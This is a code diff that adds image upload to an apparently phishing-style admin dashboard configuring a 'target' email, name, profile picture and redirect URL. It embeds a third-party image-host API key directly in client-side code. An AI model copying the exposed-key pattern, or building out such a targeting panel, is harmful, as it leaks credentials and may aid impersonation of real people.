@@ -1,10 +1,11 @@
 "use client";
 
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, ChangeEvent } from "react";
 import type { AppState } from "@/lib/state";
 import { useForm, type SubmitHandler } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
+import Image from "next/image";
 
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
@@ -13,7 +14,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { RefreshCw, Trash2 } from "lucide-react";
+import { RefreshCw, Trash2, UserCircle } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 
 type ConfigFormData = {
@@ -26,22 +27,29 @@ type ConfigFormData = {
 const configSchema = z.object({
     targetEmail: z.string().email({ message: "Invalid email address." }),
     targetName: z.string().min(1, { message: "Name is required." }),
-    targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }),
+    targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }).or(z.string().optional()),
     redirectUrl: z.string().url({ message: "Please enter a valid URL." }),
 });
 
 export function AdminDashboard() {
   const [state, setState] = useState<AppState | null>(null);
+  const [isUploading, setIsUploading] = useState(false);
+  const [imagePreview, setImagePreview] = useState<string | null>(null);
+  const [selectedFile, setSelectedFile] = useState<File | null>(null);
   const { toast } = useToast();
 
   const {
     register,
     handleSubmit,
     reset,
+    setValue,
+    watch,
     formState: { errors },
   } = useForm<ConfigFormData>({
     resolver: zodResolver(configSchema),
   });
+
+  const profilePictureUrl = watch("targetProfilePicture");
 
   const fetchState = useCallback(async () => {
     try {
@@ -64,12 +72,80 @@ export function AdminDashboard() {
     return () => clearInterval(interval);
   }, [fetchState]);
 
+  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      setSelectedFile(file);
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        setImagePreview(reader.result as string);
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const uploadImage = async (file: File): Promise<string | null> => {
+    setIsUploading(true);
+    const reader = new FileReader();
+    return new Promise((resolve) => {
+      reader.onload = async (event) => {
+        const base64Image = (event.target?.result as string).split(",")[1];
+        if (!base64Image) {
+            toast({ variant: "destructive", title: "Error", description: "Could not read image file."});
+            setIsUploading(false);
+            resolve(null);
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append("key", "6d207e02198a847aa98d0a2a901485a5");
+        formData.append("source", base64Image);
+        
+        try {
+          const response = await fetch("https://freeimage.host/api/1/upload", {
+            method: "POST",
+            body: formData,
+          });
+
+          const result = await response.json();
+          if (result.status_code === 200) {
+            resolve(result.image.url);
+          } else {
+            console.error("Image upload failed:", result);
+            toast({ variant: "destructive", title: "Upload Failed", description: result.error.message });
+            resolve(null);
+          }
+        } catch (error) {
+          console.error("Image upload failed:", error);
+          toast({ variant: "destructive", title: "Error", description: "Could not upload image." });
+          resolve(null);
+        } finally {
+          setIsUploading(false);
+        }
+      };
+      reader.readAsDataURL(file);
+    });
+  };
+
   const onConfigSubmit: SubmitHandler<ConfigFormData> = async (data) => {
+    let finalData = { ...data };
     try {
+      if (selectedFile) {
+        const uploadedUrl = await uploadImage(selectedFile);
+        if (uploadedUrl) {
+          finalData.targetProfilePicture = uploadedUrl;
+          setValue("targetProfilePicture", uploadedUrl);
+          setSelectedFile(null);
+          setImagePreview(null);
+        } else {
+            return; // Stop submission if upload fails
+        }
+      }
+
       const res = await fetch("/api/state", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ action: "setConfig", config: data }),
+        body: JSON.stringify({ action: "setConfig", config: finalData }),
       });
       if (res.ok) {
         toast({ title: "Success", description: "Configuration saved." });
@@ -199,8 +275,24 @@ export function AdminDashboard() {
                         {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
                       </div>
                       <div>
-                        <Label htmlFor="targetProfilePicture">Target Profile Picture URL</Label>
-                        <Input id="targetProfilePicture" {...register("targetProfilePicture")} />
+                        <Label>Target Profile Picture</Label>
+                        <div className="flex items-center gap-4 mt-2">
+                          {imagePreview || profilePictureUrl ? (
+                            <Image 
+                              src={imagePreview || profilePictureUrl!}
+                              alt="Profile Preview"
+                              width={64}
+                              height={64}
+                              className="rounded-full"
+                              data-ai-hint="person avatar" 
+                            />
+                          ) : (
+                            <div className="w-16 h-16 rounded-full bg-muted flex items-center justify-center">
+                                <UserCircle className="w-10 h-10 text-muted-foreground" />
+                            </div>
+                          )}
+                          <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} />
+                        </div>
                         {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
                       </div>
                       <div>
@@ -208,7 +300,9 @@ export function AdminDashboard() {
                         <Input id="redirectUrl" {...register("redirectUrl")} />
                         {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
                       </div>
-                      <Button type="submit" className="w-full">Save Configuration</Button>
+                      <Button type="submit" className="w-full" disabled={isUploading}>
+                        {isUploading ? "Uploading..." : "Save Configuration"}
+                      </Button>
                     </form>
                   </CardContent>
                 </Card>
@@ -217,3 +311,5 @@ export function AdminDashboard() {
     </div>
   );
 }
+
+    
